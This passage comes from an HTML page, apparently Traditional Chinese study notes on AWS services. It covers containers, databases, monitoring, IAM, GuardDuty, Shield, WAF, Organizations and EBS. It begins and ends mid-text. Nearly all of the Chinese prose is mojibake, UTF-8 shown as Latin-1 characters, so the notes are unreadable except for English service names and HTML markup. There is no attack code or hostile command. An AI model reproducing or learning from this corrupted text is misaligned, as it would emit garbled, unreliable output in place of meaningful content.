çš„å…¨å—ç®¡æ¡Œé¢è™›æ“¬åŒ–æœå‹™ï¼Œå¯è®“æ‚¨å¾ä»»ä½•æ”¯æ´çš„è£ç½®å­˜å–è³‡æºã€‚</li></ul><h2 id="å®¹å™¨"><a href="#å®¹å™¨" class="headerlink" title="å®¹å™¨"></a>å®¹å™¨</h2><h3 id="Amazon-Elastic-Container-Service-Amazon-ECS"><a href="#Amazon-Elastic-Container-Service-Amazon-ECS" class="headerlink" title="Amazon Elastic Container Service (Amazon ECS)"></a>Amazon Elastic Container Service (Amazon ECS)</h3><ul><li>æ˜¯å¯é«˜åº¦æ“´å±•çš„é«˜æ•ˆèƒ½å®¹å™¨ç®¡ç†ç³»çµ±ï¼Œå¯è®“æ‚¨åœ¨ AWS ä¸Šè¼•é¬†åŸ·è¡ŒåŠæ“´å±•å®¹å™¨åŒ–æ‡‰ç”¨ç¨‹å¼</li><li>æ”¯æ´Docker</li></ul><h3 id="Amazon-Elastic-Kubernetes-Service-Amazon-EKS"><a href="#Amazon-Elastic-Kubernetes-Service-Amazon-EKS" class="headerlink" title="Amazon Elastic Kubernetes Service (Amazon EKS)"></a>Amazon Elastic Kubernetes Service (Amazon EKS)</h3><ul><li>é€éå®ƒå³å¯åœ¨ AWS ä¸ŠåŸ·è¡Œ Kubernetes</li><li></li></ul><h3 id="AWS-Fargate"><a href="#AWS-Fargate" class="headerlink" title="AWS Fargate"></a>AWS Fargate</h3><ul><li>å®¹å™¨å°ˆç”¨çš„ç„¡ä¼ºæœå™¨é‹ç®—å¼•æ“ï¼ŒAmazon ECS å’Œ Amazon EKS éƒ½é©ç”¨ã€‚</li></ul><h2 id="è³‡æ–™åº«"><a href="#è³‡æ–™åº«" class="headerlink" title="è³‡æ–™åº«"></a>è³‡æ–™åº«</h2><h3 id="Amazon-Aurora"><a href="#Amazon-Aurora" class="headerlink" title="Amazon Aurora"></a>Amazon Aurora</h3><ul><li>ä¼æ¥­ç´šé—œè¯å¼è³‡æ–™åº«ï¼Œæ¯”æ¨™æº–MySQLå¿«5å€ï¼Œæ¯”æ¨™æº–PostgreSQLå¿«3å€</li><li>æ”¯æ´å…©ç¨®è³‡æ–™åº«é¸é …: MySQL, PostgreSQL</li><li>æˆæœ¬æ¥µä½</li><li>è³‡æ–™æœƒè¢«è¤‡å¯«åˆ°å„é …è¨­æ–½(éš¨æ™‚æœƒæœ‰å…­ä»½å‰¯æœ¬ï¼Œæœ€é«˜å¯é”15å€‹è®€å–å‰¯æœ¬)</li><li>æŒçºŒå‚™ä»½åˆ°Amazon S3</li><li>Point-in Timeå¾©åŸ</li></ul><h3 id="Amazon-DynamoDB"><a href="#Amazon-DynamoDB" class="headerlink" title="Amazon DynamoDB"></a>Amazon DynamoDB</h3><ul><li>ç„¡ä¼ºæœå™¨è³‡æ–™åº«ï¼Œç„¡é ˆç®¡ç†åŸºç¤åŸ·è¡Œå€‹é«”æˆ–åŸºç¤è¨­æ–½</li><li>å»ºç«‹<strong>è¡¨æ ¼</strong>ï¼Œä»¥å­˜æ”¾æˆ–æŸ¥çœ‹è³‡æ–™</li><li>è³‡æ–™æœƒè¢«åŠƒåˆ†æˆé …ç›®(Item)ï¼Œé …ç›®å…·æœ‰å±¬æ€§(Attribute)</li><li>å±¬æ€§ä»£è¡¨è³‡æ–™ä¸­çš„ä¸åŒåŠŸèƒ½</li><li>æœƒåœ¨å¤šå€‹å¯ç”¨å€åŸŸç•¶ä¸­å„²å­˜ç¡¬ç¢Ÿé¡åƒï¼Œæé«˜å¯ç”¨æ€§</li><li>é«˜æ•ˆèƒ½ä¸”å¯å¤§è¦æ¨¡æ“´å±•ï¼Œå›æ‡‰æ™‚é–“ç‚ºæ¯«ç§’ç´š</li><li>å±¬æ–¼NoSQL è³‡æ–™åº«</li><li>ç„¡æ³•é€éSQLé€²è¡ŒæŸ¥è©¢ï¼Œå¯æ ¹æ“šKEYå±¬æ€§ä¾†é€²è¡ŒæŸ¥è©¢ï¼Œéˆæ´»æ€§é«˜</li><li>ä½¿ç”¨æ¡ˆä¾‹: Amazon Prime Dayæ‡‰ä»˜å¤§é‡ä½¿ç”¨è€…è¨‚å–®è«‹çƒ</li></ul><h3 id="Amazon-ElastiCache"><a href="#Amazon-ElastiCache" class="headerlink" title="Amazon ElastiCache"></a>Amazon ElastiCache</h3><ul><li>ç‚ºè³‡æ–™åº«æä¾›å¿«å–å±¤ï¼Œå¢åŠ è³‡æ–™åº«è®€å¯«é€Ÿåº¦<ul><li>Memcached</li><li>Redis</li></ul></li></ul><h3 id="Amazon-DAX-DynamoDB-Accelerator"><a href="#Amazon-DAX-DynamoDB-Accelerator" class="headerlink" title="Amazon DAX(DynamoDB Accelerator)"></a>Amazon DAX(DynamoDB Accelerator)</h3><ul><li>ç‚ºDynamoDBæä¾›åŸç”Ÿå¿«é€Ÿå±¤ï¼Œæ”¹å–„NoSQLè³‡æ–™è®€å–æ™‚é–“</li></ul><h3 id="Amazon-Relational-Database-Service-RDS"><a href="#Amazon-Relational-Database-Service-RDS" class="headerlink" title="Amazon Relational Database Service(RDS)"></a>Amazon Relational Database Service(RDS)</h3><ul><li>ç‚º<code>é—œè¯å¼è³‡æ–™åº«ç®¡ç†æœå‹™</code> (è³‡æ–™æœƒå·²èˆ‡å…¶ä»–è³‡æ–™å»ºç«‹é—œè¯çš„æ–¹å¼ä¾†å„²å­˜)</li><li><h2 id="æ”¯æ´å¤§å¤šè³‡æ–™åº«å¼•æ“-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server"><a href="#æ”¯æ´å¤§å¤šè³‡æ–™åº«å¼•æ“-Amazon-Aurora-MySQL-PostgreSQL-MaraDB-Oracle-Micorsoft-SQL-Server" class="headerlink" title="æ”¯æ´å¤§å¤šè³‡æ–™åº«å¼•æ“  - Amazon Aurora  - MySQL  - PostgreSQL  - MaraDB  - Oracle  - Micorsoft SQL Server"></a>æ”¯æ´å¤§å¤šè³‡æ–™åº«å¼•æ“<br>  - Amazon Aurora<br>  - MySQL<br>  - PostgreSQL<br>  - MaraDB<br>  - Oracle<br>  - Micorsoft SQL Server</h2></li><li>å„ªé»<ul><li>è‡ªå‹•ä¿®è£œæ¼æ´</li><li>å‚™ä»½</li><li>å†—é¤˜</li><li>å®¹éŒ¯ç§»è½‰</li><li>ç½é›£å¾©åŸ</li></ul></li><li>å¯é€²ä¸€æ­¥å°‡å®ƒå€‘éƒ¨ç½²è‡³Amazon Aurora</li></ul><h3 id="Amazon-Redshift"><a href="#Amazon-Redshift" class="headerlink" title="Amazon Redshift"></a>Amazon Redshift</h3><ul><li>å°ˆç‚ºé«˜é€Ÿã€å³æ™‚æ“·å–å’ŒæŸ¥è©¢çš„è³‡æ–™åº«ï¼Œç”¨æ–¼è³‡æ–™åˆ†æå·¥ä½œ</li><li>å¤§å¤šé—œè¯å¼è³‡æ–™åº«å®¹é‡æœ‰ä¸€å®šé™åˆ¶ï¼Œå› æ­¤ä¸é©åˆç”¨æ–¼æ­·å²è³‡æ–™åˆ†æ</li><li>ä¸”è³‡æ–™ç¨®é¡ç¹é›œï¼Œä¸€ç­é—œè¯å¼è³‡æ–™åº«é›£æ˜“æ‡‰ä»˜ï¼Œå› æ­¤é€™æ™‚éœ€è¦<strong>è³‡æ–™å€‰å„²(Data Warehouse)</strong></li><li>è³‡æ–™å€‰å„²è² è²¬è™•ç†å¤§æ•¸æ“šï¼Œé©ç”¨æ–¼æ­·å²åˆ†æè€Œä¸æ˜¯ç‡Ÿé‹åˆ†æ</li><li>ä¾‹å¦‚ï¼Œä¸€å°æ™‚å‰æˆ‘å€‘çš„è²©å”®é‡å¦‚ä½•ï¼Œé€™ç¨®æ•¸å­—å·²ç¶“ä¸æœƒå†è®Šå‹•äº†</li><li>è€Œä¸€èˆ¬ç‡Ÿé‹åˆ†æå‰‡æ˜¯ï¼Œæˆ‘å€‘ç¾åœ¨çš„å’–å•¡åº«å­˜å¦‚ä½•ï¼Œé€™ç¨®éš¨æ™‚åœ¨è®Šå‹•çš„è³‡æ–™</li><li>Redshift å¯ä»¥å¯¦ç¾å‚³çµ±è³‡æ–™åº«çš„10å€æ•ˆèƒ½</li></ul><h3 id="AWS-Database-Migration-Service-Amazon-DMS"><a href="#AWS-Database-Migration-Service-Amazon-DMS" class="headerlink" title="AWS Database Migration Service(Amazon DMS)"></a>AWS Database Migration Service(Amazon DMS)</h3><ul><li>å°‡å®¢æˆ¶è³‡æ–™åº«è½‰ç§»è‡³AWS</li><li>åœ¨é·ç§»æœŸé–“è³‡æ–™åº«ä»ç„¶èƒ½å¤ ä¿æŒå®Œå…¨é‹ä½œ</li><li>ä»°è³´è©²è³‡æ–™åº«çš„æ‡‰ç”¨ç¨‹å¼åœæ©Ÿæ™‚é–“èƒ½å¤ é™è‡³æœ€ä½</li><li>ä¾†æºèˆ‡ç›®æ¨™è³‡æ–™åº«ä¸ç”¨å¼ç›¸é€šé¡å‹çš„è³‡æ–™åº«<ul><li>Oracle -&gt;RDS for Oracle</li><li>MySQL -&gt; RDS for MySQL</li></ul></li><li>ç•°è³ªé·ç§»<ul><li>ä¾†æ·µè³‡æ–™åº«ä»¥åŠç›®æ¨™è³‡æ–™åº«çš„ <strong>çµæ§‹æè¿°(Schema)çµæ§‹</strong>ã€<strong>è³‡æ–™é¡å‹</strong>ã€<strong>è³‡æ–™åº«ç¨‹å¼ç¢¼</strong> ä¸åŒæ™‚ï¼Œå°±éœ€è¦ç•°è³ªé·ç§»</li><li>éœ€è¦å…©æ­¥é©Ÿ<ul><li><ol><li>AWS Schema Conversion Toolé€²è¡Œè½‰æ›</li></ol></li><li><ol start="2"><li>DMS ç”¨ä¾†é·ç§»è³‡æ–™åº«</li></ol></li></ul></li></ul></li><li>é–‹ç™¼å’Œæ¸¬è©¦è³‡æ–™åº«é·ç§»<ul><li>å°‡è³‡æ–™åº«å‰¯æœ¬é·ç§»åˆ°ç”Ÿç”¢æˆ–æ¸¬è©¦ç’°å¢ƒï¼Œå¯ä½¿ç”¨DMSæœå‹™</li></ul></li><li>è³‡æ–™åº«åˆä½µ</li><li>æŒçºŒè³‡æ–™åº«è¤‡å¯«<ul><li>å¯ç”¨æ–¼ç½é›£å¾©åŸ</li></ul></li></ul><h3 id="AWS-DocumentDB"><a href="#AWS-DocumentDB" class="headerlink" title="AWS DocumentDB"></a>AWS DocumentDB</h3><ul><li>ç”¨æ–¼å®Œæ•´æ–‡ä»¶å„²å­˜</li><li>é©åˆå…§å®¹ç®¡ç†ã€ç›®éŒ„ã€ä½¿ç”¨è€…è¨­å®šæª”</li></ul><h3 id="Amazon-Neptune"><a href="#Amazon-Neptune" class="headerlink" title="Amazon Neptune"></a>Amazon Neptune</h3><ul><li>åœ–å½¢å¼è³‡æ–™åº«ç”¨æ–¼ç¤¾ç¾¤ç¶²è·¯å’Œæ¨è–¦å¼•æ“è¨­è¨ˆ</li><li>ä¹Ÿé©åˆè©é¨™åµæ¸¬éœ€æ±‚</li><li>æˆ–è€…ä¾›æ‡‰éˆè¿½è¹¤ç®¡ç†</li></ul><h3 id="Amazon-QLDB-Quantum-Ledger-Database"><a href="#Amazon-QLDB-Quantum-Ledger-Database" class="headerlink" title="Amazon QLDB(Quantum Ledger Database)"></a>Amazon QLDB(Quantum Ledger Database)</h3><ul><li>ä¸å¯è®Šçš„ç´€éŒ„ç³»çµ±</li><li>å…¶ä¸­æ‰€æœ‰æ¢ç›®éƒ½ç„¡æ³•å­˜ç¨½æ ¸ä¸­åˆªé™¤</li></ul><h3 id="AWS-Auto-Scaling"><a href="#AWS-Auto-Scaling" class="headerlink" title="AWS Auto Scaling"></a>AWS Auto Scaling</h3><p><img src="https://i.imgur.com/6uOa7tx.png"></p><ul><li>å‹•æ…‹æ“´å±•</li><li>é æ¸¬æ€§æ“´å±•<br><img src="https://i.imgur.com/oPepLm4.png"></li></ul><h3 id="AWS-CloudFormation"><a href="#AWS-CloudFormation" class="headerlink" title="AWS CloudFormation"></a>AWS CloudFormation</h3><ul><li>æ‚¨å¯ä»¥å°‡åŸºç¤è¨­æ–½ç•¶ä½œç¨‹å¼ç¢¼(IaC)ä¾†è™•ç†ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œæ‚¨å¯ä»¥é€éæ’°å¯«ç¨‹å¼ç¢¼è¡Œä¾†å»ºç«‹ç’°å¢ƒï¼Œç„¡éœ€ä½¿ç”¨ AWS ç®¡ç†ä¸»æ§å°å€‹åˆ¥ä½ˆå»ºè³‡æºã€‚</li><li>è®“æ‚¨ä¸å¿…åŸ·è¡Œæ‰‹å‹•å‹•ä½œæˆ–æ’°å¯«è‡ªè¨‚æŒ‡ä»¤ç¢¼ï¼Œå°±èƒ½é »ç¹å»ºç«‹åŸºç¤è¨­æ–½å’Œæ‡‰ç”¨ç¨‹å¼ã€‚å®ƒæœƒåœ¨ç®¡ç†å †ç–Šæ™‚åˆ¤æ–·éœ€è¦åŸ·è¡Œçš„æ­£ç¢ºä½œæ¥­ï¼Œä¸¦åœ¨åµæ¸¬åˆ°éŒ¯èª¤æ™‚è‡ªå‹•å¾©åŸè®Šæ›´ã€‚</li></ul><h3 id="AWS-CloudTrail"><a href="#AWS-CloudTrail" class="headerlink" title="AWS CloudTrail"></a>AWS CloudTrail</h3><ul><li>å…¨æ–¹ä½çš„APIç¨½æ ¸å·¥å…·</li><li>æ‰€æœ‰å°AWSæå‡ºçš„APIè«‹æ±‚ï¼Œéƒ½æœƒè¨˜éŒ„åœ¨CloudTrailä¸­</li><li>ä¸¦ä¸”è¨˜éŒ„èª°æå‡ºè«‹æ±‚ï¼Œä½•æ™‚ç™¼å‡ºè«‹æ±‚ï¼ŒIPç‚ºåªç‚ºå’Œï¼Œå›æ‡‰åˆæ˜¯ç”šéº¼ç­‰ç­‰</li><li>å¯ä»¥åœ¨s3 bucketç•¶ä¸­ç„¡æœŸé™å„²å­˜é€™äº›æ—¥èªŒ</li><li>CloudTrail ä¸­çš„äº‹ä»¶é€šå¸¸æœƒåœ¨ API å‘¼å«å¾Œçš„ 15 åˆ†é˜å…§æ›´æ–°</li></ul><h3 id="Amazon-CloudWatch"><a href="#Amazon-CloudWatch" class="headerlink" title="Amazon CloudWatch"></a>Amazon CloudWatch</h3><ul><li>CloudWatchå¯ä»¥è®“å®¢æˆ¶ç›£æ§awsåŸºç¤è¨­æ–½ä»¥åŠé‹è¡Œåœ¨ä¸Šé¢çš„æ‡‰ç”¨ç¨‹å¼</li><li>ä»–é€éè¿½è¹¤ä»¥åŠç›£æ§<strong>æŒ‡æ¨™(èˆ‡è³‡æºç›¸é—œçš„è®Šæ•¸)</strong> ä¾†é‹ä½œ<ul><li>CPUä½¿ç”¨ç‡</li><li>RAMä½¿ç”¨ç‹€æ…‹</li></ul></li><li>CloudWatch è­¦ç¤º(Alerm)<ul><li>ç•¶æŒ‡æ¨™é”åˆ°é–¥å€¼ï¼Œå¯ä»¥è§¸ç™¼è­¦ç¤º</li><li>æ•´åˆSNSï¼Œå¯ä»¥å‚³é€è­¦ç¤ºç°¡è¨Š</li></ul></li><li>CloudWatach Dashboard <ul><li>ä»¥è¿‘å³æ™‚æ–¹å¼åˆ—å‡ºæŒ‡æ¨™</li></ul></li><li>CloudWatchçš„å„ªé»:<ul><li>å¾ä¸€å€‹é›†ä¸­ä½ç½®å­˜å–æ‰€æœ‰æŒ‡æ¨™ï¼Œç²å¾—å…¨ç³»çµ±çš„å¯è¦‹æ€§</li><li>æª¢è¦–æ‡‰ç”¨ã€åŸºç¤è¨­æ–½åŠæœå‹™</li><li>æ¸›å°‘<strong>MTTR(è§£æ±ºå•é¡Œçš„å¹³å‡æ™‚é–“)<strong>ï¼Œ</strong>ä¸¦æ”¹å–„ç¸½æ•´é«”æˆæœ¬(TCO)</strong></li><li>æ·±å…¥åˆ†ææ‡‰ç”¨ï¼Œä¸¦å¹«åŠ©æœ€ä½³åŒ–å®¢æˆ¶æ‡‰ç”¨</li></ul></li></ul><h3 id="AWS-Trusted-Advisor"><a href="#AWS-Trusted-Advisor" class="headerlink" title="AWS Trusted Advisor"></a>AWS Trusted Advisor</h3><ul><li>ç‚ºä¸€è‡ªå‹•åŒ–é¡§å•</li><li>ä»–æœƒæ ¹æ“š<strong>äº”å¤§æ”¯æŸ±</strong>ä¾†è©•ä¼°è³‡æº<ul><li>æˆæœ¬æœ€ä½³åŒ–</li><li>æ•ˆèƒ½</li><li>å®‰å…¨</li><li>å®¹éŒ¯èƒ½åŠ›</li><li>Service Limits</li></ul></li><li>æœƒå°æ¯å€‹æ”¯æŸ±é€²è¡Œä¸€ç³»åˆ—æª¢æŸ¥ï¼Œä¸¦ç·¨è­¯åˆ†é¡é …ç›®ä¾›æª¢è¦–</li><li>æœ‰äº›æª¢æŸ¥å…è²»</li><li>æª¢æŸ¥é …ç›®ä¾‹å¦‚: æ˜¯å¦å•Ÿç”¨MFA</li></ul><h2 id="ç¶²è·¯é€£çµèˆ‡å…§å®¹äº¤ä»˜"><a href="#ç¶²è·¯é€£çµèˆ‡å…§å®¹äº¤ä»˜" class="headerlink" title="ç¶²è·¯é€£çµèˆ‡å…§å®¹äº¤ä»˜"></a>ç¶²è·¯é€£çµèˆ‡å…§å®¹äº¤ä»˜</h2><h3 id="AWS-Elastic-Load-Balancing"><a href="#AWS-Elastic-Load-Balancing" class="headerlink" title="AWS Elastic Load Balancing"></a>AWS Elastic Load Balancing</h3><ul><li>ä¸€ç¨®å¯åœ¨å¤šå€‹è³‡æº (ä¾‹å¦‚ Amazon EC2 åŸ·è¡Œå€‹é«”) ä¹‹é–“è‡ªå‹•åˆ†é…å‚³å…¥æ‡‰ç”¨ç¨‹å¼æµé‡çš„ AWS æœå‹™</li></ul><p><img src="https://i.imgur.com/sJyERPV.png"></p><ul><li>ELBæœƒä½œç‚ºå‚³å…¥ Auto Scaling ç¾¤çµ„ä¹‹æ‰€æœ‰ Web æµé‡çš„å–®ä¸€è¯çµ¡çª—å£ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œç•¶æ‚¨ç‚ºäº†å›æ‡‰å‚³å…¥æµé‡è€Œæ–°å¢æˆ–ç§»é™¤ Amazon EC2 åŸ·è¡Œå€‹é«”æ™‚ï¼Œé€™äº›è«‹æ±‚æœƒå…ˆè·¯ç”±åˆ°è² è¼‰å¹³è¡¡å™¨ï¼Œç„¶å¾Œåˆ†æ•£åˆ°å³å°‡è™•ç†é€™äº›è«‹æ±‚çš„å¤šå€‹è³‡æºä¸­ã€‚</li></ul><h2 id="å®‰å…¨æ€§ã€è­˜åˆ¥èˆ‡åˆè¦æ€§"><a href="#å®‰å…¨æ€§ã€è­˜åˆ¥èˆ‡åˆè¦æ€§" class="headerlink" title="å®‰å…¨æ€§ã€è­˜åˆ¥èˆ‡åˆè¦æ€§"></a>å®‰å…¨æ€§ã€è­˜åˆ¥èˆ‡åˆè¦æ€§</h2><p>å…±åŒè²¬ä»»æ¨¡å‹(Shared Responsibility Model)<br><img src="https://i.imgur.com/wMSpH1U.png"><br><img src="https://i.imgur.com/HOmBArE.png"></p><ul><li>å®¢æˆ¶è¨˜å¾—è‡ªå·±patch OS</li><li>awsèˆ‡å®¢æˆ¶çš„é—œä¿‚å¦‚åŒæˆ¿å±‹å±‹ä¸»ä»¥åŠå»ºå•†</li></ul><h3 id="AWS-Artifact"><a href="#AWS-Artifact" class="headerlink" title="AWS Artifact"></a>AWS Artifact</h3><ul><li>å¯ä»¥å­˜å–åˆè¦æ€§å ±å‘Šï¼Œå ±å‘Šæœ¬èº«ç”±ç¬¬ä¸‰æ–¹æ‰€æª¢é©—</li><li>AWS Artifact å”è­°<ul><li>å…¬å¸éœ€è¦èˆ‡ AWS ç°½ç½²é—œæ–¼æ‚¨åœ¨æ•´å€‹ AWS æœå‹™ä¸­ä½¿ç”¨ç‰¹å®šé¡å‹è³‡è¨Šçš„å”å®š</li><li>å¯ä»¥æª¢é–±ã€æ¥å—å’Œç®¡ç†å€‹åˆ¥å¸³æˆ¶ä»¥åŠ AWS Organizations ä¸­æ‰€æœ‰å¸³æˆ¶çš„å”è­°ã€‚å…¶ä¸­æœƒæä¾›ä¸åŒé¡å‹çš„å”è­°</li></ul></li><li>AWS Artifact å ±å‘Š<ul><li>å¯ä»¥æª¢é–±ã€æ¥å—å’Œç®¡ç†å€‹åˆ¥å¸³æˆ¶ä»¥åŠ AWS Organizations ä¸­æ‰€æœ‰å¸³æˆ¶çš„å”è­°ã€‚å…¶ä¸­æœƒæä¾›ä¸åŒé¡å‹çš„å”è­°ï¼Œå¯åœ¨ AWS Artifact å ±å‘Šä¸­å­˜å–æ­¤è³‡è¨Š</li><li>åœ¨ AWS Artifact å ±å‘Šä¸­å­˜å–æ­¤è³‡è¨Š</li></ul></li></ul><h3 id="Amazon-GuardDuty"><a href="#Amazon-GuardDuty" class="headerlink" title="Amazon GuardDuty"></a>Amazon GuardDuty</h3><ul><li>AWSå¨è„…åµæ¸¬æœå‹™</li><li>æœƒåˆ†æå¸³æˆ¶ç”¢ç”Ÿçš„ä¸­ç¹¼è³‡æ–™é€£çºŒä¸²æµï¼Œåƒæ˜¯ä¾†è‡ªCloudTrailã€VPC Flow Logsã€DNS log</li><li>èˆ‡awsç¾æœ‰æœå‹™åˆ†é–‹åŸ·è¡Œï¼Œä¸æœƒå½±éŸ¿ç¾æœ‰åŸºç¤è¨­è¨­æ–½æ•ˆèƒ½</li></ul><h3 id="AWS-Identity-and-Access-Management-IAM"><a href="#AWS-Identity-and-Access-Management-IAM" class="headerlink" title="AWS Identity and Access Management (IAM)"></a>AWS Identity and Access Management (IAM)</h3><ul><li>é€éIAMå¯ä»¥ç²¾ç´°çš„æ§åˆ¶æ¬Šé™</li><li>åœ¨IAMä¸­å¯ä»¥å»ºç«‹IAM User</li><li>IAMåœ¨å‰›å»ºç«‹æ™‚ï¼Œé è¨­ä¸å…·å‚™ä»»ä½•è¨±å¯(ä¸å¯å»ºç«‹EC2, S3â€¦etc)</li><li>æœ€ä½æ¬Šé™åŸå‰‡</li><li>IAMæ”¿ç­–<ul><li>æ˜¯JSONæ–‡ä»¶ï¼Œæè¿°ä½¿ç”¨è€…å¯ä»¥åŸ·è¡Œæˆ–ä¸å¯åŸ·è¡Œé‚£äº›APIæ“ä½œ</li><li>å¯ä»¥å°‡æ”¿ç­–é€£æ¥åˆ°ä½¿ç”¨è€…æˆ–æ˜¯ç¾¤çµ„</li><li>Effect: <code>Allow</code> <code>Deny</code></li><li>Action: å¯å°è³‡æºæœ€å“ªäº›è¡Œç‚º</li><li>Resource: APIå‘¼å«é©ç”¨æ–¼å“ªç¨®AWSè³‡æº</li></ul></li><li>IAM ç¾¤çµ„ </li><li><img src="https://i.imgur.com/u29juKI.png"></li><li>è§’è‰²(Role)<ul><li>ä¸åŒå·¥ä½œæ™‚ï¼Œè§’è‰²æœƒé€²è¡Œåˆ‡æ›</li><li>åœ¨AWSä¸­ä¹Ÿèƒ½å¤ å»ºç«‹è§’è‰²</li><li>è§’è‰²å…·æœ‰ç›¸é—œè¯çš„è¨±å¯ï¼Œå¯ä»¥å…è¨±æˆ–æ‹’çµ•ç‰¹å®šå‹•ä½œ</li><li>ä½¿ç”¨è€…å¯ä»¥æš«æ™‚æ“”ä»»æŸå€‹è§’è‰²ï¼Œä½†æ²’æœ‰ä½¿ç”¨è€…åç¨±æˆ–å¯†ç¢¼</li><li>åƒ…èƒ½ç²å¾—æš«æ™‚çš„è¨±å¯æ¬Š</li></ul></li><li><img src="https://i.imgur.com/Ds4cHxv.png"></li></ul><h3 id="Amazon-Inspector"><a href="#Amazon-Inspector" class="headerlink" title="Amazon Inspector"></a>Amazon Inspector</h3><ul><li>é‡å°åŸºç¤è¨­æ–½åŸ·è¡Œè‡ªå‹•åŒ–å®‰å…¨è©•ä¼°ï¼Œä»¥æé«˜å®‰å…¨æ€§å’Œawséƒ¨ç½²æ‡‰ç”¨ç¨‹å¼çš„åˆè¦æ€§</li><li>å¯ç”¨æ–¼å¯Ÿçœ‹èˆ‡Best Practiceä¹‹é–“çš„åå·®</li><li>æ¼æ´æª¢æŸ¥</li><li>æœå‹™åˆ†æˆä¸‰ç¨®:<ul><li>ç¶²è·¯çµ„æ…‹å¯é”æ€§éƒ¨åˆ†</li><li>Amazon ä»£ç†ç¨‹å¼</li><li>å®‰å…¨æ€§è©•å®šæœå‹™</li></ul></li></ul><h3 id="AWS-Shield"><a href="#AWS-Shield" class="headerlink" title="AWS Shield"></a>AWS Shield</h3><ul><li>æ˜¯ä¸€é …å¯ä¿è­·æ‡‰ç”¨ç¨‹å¼å…æ–¼é­å— DDoS æ”»æ“Šçš„æœå‹™</li><li>AWS Shideld Syandard<ul><li>å¯å…è²»è‡ªå‹•ä¿è­·æ‰€æœ‰ AWS å®¢æˆ¶</li><li>ä½¿ç”¨åˆ†ææŠ€è¡“å³æ™‚åµæ¸¬ä¸¦è‡ªå‹•å»¶ç·©æƒ¡æ„æµé‡</li></ul></li><li>AWS Shield Advanced<ul><li>å¯æä¾›è©³ç´°çš„æ”»æ“Šè¨ºæ–·ï¼Œå’Œåµæ¸¬èˆ‡æ¸›è¼•è¤‡é›œçš„ DDoS æ”»æ“Šã€‚</li></ul></li></ul><h3 id="AWS-WAF"><a href="#AWS-WAF" class="headerlink" title="AWS WAF"></a>AWS WAF</h3><ul><li>ä½¿ç”¨Webæ‡‰ç”¨ç¨‹å¼é˜²ç«ç‰†(WAF)ä¾†ç¯©é¸å‚³å…¥æµé‡</li><li>æ©Ÿå™¨å­¸ç³»å¹«åŠ©è­˜åˆ¥æ–°å¨è„…</li><li>ä¸»å‹•é˜²ç¦¦</li><li>å¯ä»¥è¨­å®šWeb ACL</li></ul><h3 id="AWS-Organizations"><a href="#AWS-Organizations" class="headerlink" title="AWS Organizations"></a>AWS Organizations</h3><ul><li>ç®¡ç†å¤šå€‹awså¸³æˆ¶ä¸­çš„ä¸­å¤®ä½ç½®</li><li>ç®¡ç†å¸³å–®ã€æ§åˆ¶å­˜å–ã€åˆè¦èˆ‡å®‰å…¨</li><li>è®“æ‰€æœ‰awså¸³è™Ÿå…±äº«è³‡æº</li><li>åŠŸèƒ½:<ul><li>é›†ä¸­å¼ç®¡ç†awså¸³æˆ¶</li><li>æ‰€æœ‰å¸³æˆ¶å¯åˆä½µå¸³å–®(å…·æœ‰æŠ˜æ‰£)</li><li>å¯¦ä½œå¸³æˆ¶çš„éšå±¤åˆ†çµ„(ex. BU(æ¥­å‹™å–®ä½)ã€OU(çµ„ç¹”å–®ä½))</li><li>æ§åˆ¶æ¯å€‹å¸³æˆ¶å¯ä»¥å­˜å–çš„AWSæœå‹™ä»¥åŠå¯åŸ·è¡Œçš„APIå‹•ä½œ<ul><li>æœå‹™æ§åˆ¶æ”¿ç­–(SCP)ï¼Œå¯ç”¨æ–¼æŒ‡å®šæˆå“¡å¸³æˆ¶çš„æœ€å¤§è¨±å¯</li></ul></li></ul></li><li><img src="https://i.imgur.com/qwvjWXE.png"></li></ul><h3 id="Amazon-Elastic-Block-Store-Amazon-EBS"><a href="#Amazon-Elastic-Block-Store-Amazon-EBS" class="headerlink" title="Amazon Elastic Block Store (Amazon EBS)"></a>Amazon Elastic Block Store (Amazon EBS)</h3><ul><li>ä¸å¸Œæœ›æ¯æ¬¡ä½¿ç”¨å®ŒEC2åŸ·è¡Œå€‹é«”å¾Œï¼Œè³‡æ–™åº«å°±è¢«åˆªæ‰ï¼Œå‰‡å¯ä½¿ç”¨EBSæœå‹™</li><li>å¯å»ºç«‹è™›æ“¬ç¡¬ç¢Ÿï¼ŒEBSç£ç¢Ÿå€ï¼Œä¸¦é€£æ¥åˆ°EC2åŸ·è¡Œå€‹é«”ä¸Š</li><li>EBSä¸¦ä¸ç›´æ¥èˆ‡EC2ç¶å®šï¼Œå› æ­¤å¯ä»¥ç¨ç«‹æ–¼EC2çš„ç”Ÿå‘½é€±æœŸï¼Œä¾†æŒä¹…åŒ–å­˜æ”¾è³‡æ–™</li><li>éœ€å®šç¾©ï¼šå¤§å°ã€é¡å‹ã€çµ„æ…‹</li><li>ç”¨ä¾‹: æŒä¹…åŒ–å„²å­˜è®“EC2å¯«å…¥è³‡æ–™ï¼Œå› æ­¤å‚™ä»½è³‡æ–™å¾ˆé‡è¦</li><li>EBSå…è¨±å¢é‡å‚™ä»½è³‡æ–™(åˆç¨±ä½œ<strong>å¿«ç…§</strong>)</li><li>å®šæœŸç‚ºEBSé€²è¡Œå¿«ç…§ï¼Œä»¥å‚™ä»½é‡è¦è³‡æ–™</li><li><strong>åŸ·è¡Œå€‹é«”å­˜æ”¾å€</strong>: ç‚ºEC2ä¸­æ‰€æä¾›çš„è‡¨æ™‚å€å¡Šæ˜¯å­˜æ”¾å€ï¼Œç•¶EC2çµ‚æ­¢æ™‚ï¼Œå­˜æ”¾å€ä¸­çš„è³‡æ–™ä¹Ÿæœƒæ¶ˆå¤±</li><li><img src="https://i.imgur.com/8AVNGzr.png"></li><li><img src="https://i.imgur.com/1kkfeOT.png"></li><li><img src="https://i.imgur.com/QNVkgdB.png"></li><li>EBS å¿«ç…§: ç¬¬ä¸€æ¬¡å‚™ä»½æœƒè¤‡è£½ç£ç¢Ÿå€ä¸­æ‰€æœ‰è³‡æ–™ï¼Œå¾ŒçºŒå°±åªæœƒå„²æœ€è¿‘ä¸€æ¬¡å¿«ç…§ä»¥ä¾†è®Šæ›´çš„è³‡æ–™å€å¡Šï¼Œå±¬æ–¼<strong>å¢é‡å‚™ä»½</strong></li></ul><h3 id="Amazon-S3"><a href="#Amazon-S3" class="headerlink" title="Amazon S3"></a>Amazon 